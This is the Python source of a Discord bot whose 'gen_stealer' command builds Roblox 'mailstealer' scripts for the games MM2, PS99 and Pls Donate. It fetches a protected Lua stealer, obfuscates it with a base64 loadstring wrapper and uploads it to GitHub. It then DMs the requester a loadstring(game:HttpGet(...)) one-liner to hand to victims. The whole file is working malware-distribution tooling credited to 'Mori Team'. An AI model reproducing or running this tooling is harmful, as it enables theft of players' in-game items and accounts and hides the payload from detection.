import discord
from discord.ext import commands
from discord import app_commands
import secrets
import os
import requests
import base64
from typing import Optional
from flask import Flask
import threading

BOT_TOKEN = os.getenv('BOT_TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
GITHUB_REPO = "SharScript/Scripts"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

app = Flask(__name__)

@app.route('/')
def home():
    return "Discord bot is running!"

class SendFieldValueButton(discord.ui.Button):
    def __init__(self, embed: discord.Embed):
        super().__init__(style=discord.ButtonStyle.primary, label="Copy ✉️")
        self.embed = embed

    async def callback(self, interaction: discord.Interaction):
        try:
            value = self.embed.fields[0].value
            clean_value = (
                value.replace("```lua", "")
                     .replace("```", "")
                     .strip()
            )
            await interaction.response.send_message(clean_value, ephemeral=True)
        except Exception as e:
            print(f"Button error: {str(e)}")
            await interaction.response.send_message("Error Try again!", ephemeral=True)

@tree.command(
    name="gen_stealer",
    description="Set up Stealer"
)
@app_commands.describe(
    username="Username for the stealer",
    game_type="Type of game",
    webhook="Webhook URL (optional)"
)
@app_commands.choices(game_type=[
    app_commands.Choice(name="MM2", value="mm2"),
    app_commands.Choice(name="PS99", value="ps99"),
    app_commands.Choice(name="Pls Donate", value="pls_donate"),
])
async def gen_stealer(
    interaction: discord.Interaction,
    username: str,
    game_type: app_commands.Choice[str],
    webhook: Optional[str] = None
):
    await interaction.response.defer(ephemeral=True)
    try:
        if game_type.value == "mm2":
            url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
        elif game_type.value == "ps99":
            url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
        elif game_type.value == "pls_donate":
            url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
        else:
            await interaction.followup.send("Invalid game type selected.", ephemeral=True)
            return

        response = requests.get(url)
        if response.status_code != 200:
            print(f"Failed to fetch Lua code: {response.status_code}")
            await interaction.followup.send("Failed to fetch script. Please try again.", ephemeral=True)
            return

        lua_code = response.text
        filename = f"{secrets.token_hex(12)}.lua"

        with open(filename, "w", encoding="utf-8") as f:
            f.write(lua_code)

        with open(filename, "r") as f:
            content = f.read()

        obfuscated = base64.b64encode(content.encode()).decode()
        obfuscated = f"local d=function(b)return(load or loadstring)(base64.decode(b))end;local s=[[{obfuscated}]];d(s)()"

        with open(filename, 'w') as f:
            f.write(obfuscated)

        with open(filename, "r", encoding="utf-8") as f:
            obfuscated_code = f.read()

        api_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
        encoded_content = base64.b64encode(obfuscated_code.encode("utf-8")).decode("utf-8")
        commit_message = f"Add obfuscated Lua script for user {username} - game {game_type.name}"

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github+json"
        }

        response = requests.put(
            api_url,
            json={
                "message": commit_message,
                "content": encoded_content
            },
            headers=headers
        )

        if response.status_code in [200, 201]:
            raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{filename}"

            embed = discord.Embed(
                title="Mailstealer Script Generated",
                description="This script is generated exclusively for you",
                color=discord.Color.gold()
            )
            embed.add_field(name="Script", value=f'```lua\nloadstring(game:HttpGet("{raw_url}", true))()```', inline=False)
            embed.set_footer(text="Bot & Universal Stealer by Mori Team")
            embed.set_thumbnail(url="https://static.wikia.nocookie.net/pet-simulator/images/8/88/Mailbox-Release.png/revision/latest?cb=20240114132246")

            view = discord.ui.View()
            view.add_item(SendFieldValueButton(embed))

            await interaction.user.send(embed=embed, view=view)
            await interaction.followup.send(f"Check your direct messages, {interaction.user.mention}!", ephemeral=True)
        else:
            print(f"GitHub API error: {response.status_code} - {response.text}")
            await interaction.followup.send("Failed to upload script. Please try again.", ephemeral=True)

    except Exception as e:
        print(f"General error: {str(e)}")
        await interaction.followup.send("An error occurred. Please try again.", ephemeral=True)
    finally:
        if os.path.exists(filename):
            os.remove(filename)

@bot.event
async def on_ready():
    await tree.sync()
    await bot.change_presence(activity=discord.Game(name=".gg/PzWY2QX8cu"))
    print(f"success host {bot.user}")

if not BOT_TOKEN:
    print("Error: BOT_TOKEN not found in environment variables")
    exit(1)

# Run Flask on port 5000 to allow external access
def run_flask():
    app.run(host='0.0.0.0', port=5000)

threading.Thread(target=run_flask).start()

bot.run(BOT_TOKEN)
